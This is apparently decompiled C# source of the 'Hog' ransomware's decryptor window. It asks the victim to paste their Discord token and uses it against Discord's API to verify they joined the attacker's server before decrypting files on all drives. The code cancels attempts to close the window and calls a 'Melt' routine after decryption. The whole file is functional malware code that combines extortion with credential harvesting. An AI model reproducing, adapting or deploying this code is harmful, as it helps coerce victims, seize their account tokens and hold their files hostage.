using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace HogRansomwareDecryptor
{
	// Token: 0x02000002 RID: 2
	public partial class Main : Form
	{
		// Token: 0x06000002 RID: 2 RVA: 0x00002057 File Offset: 0x00000257
		public Main()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002065 File Offset: 0x00000265
		private void HideToken_CheckedChanged(object sender, EventArgs e)
		{
			if (this.HideToken.Checked)
			{
				this.Token.UseSystemPasswordChar = true;
				return;
			}
			this.Token.UseSystemPasswordChar = false;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002090 File Offset: 0x00000290
		private void OpenTutorial_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			try
			{
				Process.Start("https://www.youtube.com/watch?v=YEgFvgg7ZPI");
			}
			catch
			{
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000020C0 File Offset: 0x000002C0
		private void VisitInvite_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			try
			{
				Process.Start("https://discord.gg/" + Settings.DiscordInvite);
			}
			catch
			{
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000020F8 File Offset: 0x000002F8
		private void Main_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000020FC File Offset: 0x000002FC
		private void DecryptBtn_Click(object sender, EventArgs e)
		{
			if (Main.checking)
			{
				return;
			}
			this.DecryptBtn.Text = "Checking...";
			this.Token.Enabled = false;
			new Thread(delegate()
			{
				this.CheckToken();
			}).Start();
			Control.CheckForIllegalCrossThreadCalls = false;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x0000214C File Offset: 0x0000034C
		private void CheckToken()
		{
			Main.checking = true;
			try
			{
				using (WebClient webClient = new WebClient())
				{
					string str = webClient.DownloadString("https://discord.com/api/v8/invites/" + Settings.DiscordInvite);
					Thread.Sleep(1000);
					string value = Utils.ParseGuildID(str);
					using (WebClient webClient2 = new WebClient())
					{
						webClient2.Headers.Add("Authorization", this.Token.Text);
						string text = webClient2.DownloadString("https://discord.com/api/v8/users/@me/guilds");
						Thread.Sleep(1000);
						if (text.Contains(value))
						{
							this.Msg.Text = "It looks like you joined the server. Thank you for cooperating with us.\nWe are decrypting your files, which may take a while.\nHave a nice day!";
							this.DecryptBtn.ForeColor = Color.Lime;
							this.DecryptBtn.Text = "Decrypting...";
							using (IEnumerator<string> enumerator = (from drive in DriveInfo.GetDrives()
							select drive.RootDirectory.FullName).GetEnumerator())
							{
								while (enumerator.MoveNext())
								{
									string path = enumerator.Current;
									this.DecryptFiles(path);
								}
								goto IL_153;
							}
						}
						this.DecryptBtn.ForeColor = Color.HotPink;
						this.DecryptBtn.Text = "You didn't join!";
						Thread.Sleep(3000);
						this.DecryptBtn.ForeColor = Color.Silver;
						this.DecryptBtn.Text = "Decrypt My Files!";
						this.Token.Enabled = true;
						Main.checking = false;
						IL_153:;
					}
				}
			}
			catch (Exception ex)
			{
				string message = ex.Message;
				if (!(message == "The remote server returned an error: (401) Unauthorized."))
				{
					if (message == "The remote server returned an error: (404) Not Found.")
					{
						this.DecryptBtn.ForeColor = Color.HotPink;
						this.DecryptBtn.Text = "Invalid Invite!";
						Thread.Sleep(3000);
						this.Msg.Text = "The invite was invalid. As a result of this, we are decrypting your files.\nThis may take a while, and we apologize for the inconvenience.\nHave a nice day!";
						this.DecryptBtn.ForeColor = Color.Lime;
						this.DecryptBtn.Text = "Decrypting...";
						using (IEnumerator<string> enumerator = (from drive in DriveInfo.GetDrives()
						select drive.RootDirectory.FullName).GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								string path2 = enumerator.Current;
								this.DecryptFiles(path2);
							}
							goto IL_2CE;
						}
					}
					MessageBox.Show("Are you connected to the internet?", this.Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
					this.Token.Enabled = true;
					Main.checking = false;
				}
				else
				{
					this.DecryptBtn.ForeColor = Color.HotPink;
					this.DecryptBtn.Text = "Invalid Token!";
					Thread.Sleep(3000);
					this.DecryptBtn.ForeColor = Color.Silver;
					this.DecryptBtn.Text = "Decrypt My Files!";
					this.Token.Enabled = true;
					Main.checking = false;
				}
				IL_2CE:;
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000024A8 File Offset: 0x000006A8
		private void DecryptFiles(string path)
		{
			IEnumerable<string> files = Utils.GetFiles(path);
			ParallelOptions parallelOptions = new ParallelOptions();
			parallelOptions.MaxDegreeOfParallelism = 100;
			Parallel.ForEach<string>(files, parallelOptions, delegate(string file)
			{
				Utils.DecryptFile(file);
			});
			Utils.Melt();
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000024E7 File Offset: 0x000006E7
		private void Main_FormClosing(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}

		// Token: 0x04000001 RID: 1
		private static bool checking;
	}
}
